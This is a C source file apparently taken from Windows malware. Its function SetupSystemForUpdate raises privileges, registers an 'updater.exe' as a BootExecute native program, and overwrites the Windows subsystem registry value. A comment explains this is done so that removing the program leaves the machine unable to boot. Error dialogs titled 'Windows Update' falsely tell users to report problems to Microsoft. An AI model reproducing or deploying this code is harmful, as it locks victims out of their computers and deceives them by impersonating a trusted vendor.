#include "setup.h"
#include <processthreadsapi.h>
#include <winuser.h>



void SetupSystemForUpdate(){
    // sets up basic permissions we will need later
    BOOLEAN result;
    RtlAdjustPrivilege(19L, TRUE, FALSE, &result);
    // sets up the native subsystem app
    HKEY hKey;
    LSTATUS res = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"System\\CurrentControlSet\\Control\\Session Manager", 0, KEY_SET_VALUE, &hKey);
    if(res != ERROR_SUCCESS){
        MessageBoxW(NULL, L"Couldn't Open the Registry, Please Report this to Microsoft", L"Windows Update", MB_OK | MB_ICONERROR);
        ExitProcess(-1);
    }
    WCHAR array[] = L"C:\\Programdata\\Updater\\updater.exe\0\0";
    int size = wcslen(array) * sizeof(WCHAR);

    res = RegSetValueExW(hKey, L"BootExecute", 0, REG_MULTI_SZ, (const BYTE*)array, size);
    if(res != ERROR_SUCCESS){
        RegCloseKey(hKey);
        MessageBoxW(NULL, L"Couldn't Edit the Registry, Please Report this to Microsoft", L"Windows Update", MB_OK | MB_ICONERROR);
        ExitProcess(-1);
    }
    RegCloseKey(hKey);

    // remove the windows subsystem so if the native app gets removed they can't boot back up
    res = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"System\\CurrentControlSet\\Control\\Session Manager\\Subsystems", 0, KEY_SET_VALUE, &hKey);
    if(res != ERROR_SUCCESS){
        MessageBoxW(NULL, L"Couldn't Open the Registry, Please Report this to Microsoft", L"Windows Update", MB_OK | MB_ICONERROR);
        ExitProcess(-1);
    }
    WCHAR secarray[] = L"nope\0\0";
    size = wcslen(secarray) * sizeof(WCHAR);

    res = RegSetValueExW(hKey, L"Windows", 0, REG_SZ, (const BYTE*)secarray, size);
    if(res != ERROR_SUCCESS){
        RegCloseKey(hKey);
        MessageBoxW(NULL, L"Couldn't Edit the Registry, Please Report this to Microsoft", L"Windows Update", MB_OK | MB_ICONERROR);
        ExitProcess(-1);
    }
    RegCloseKey(hKey);

}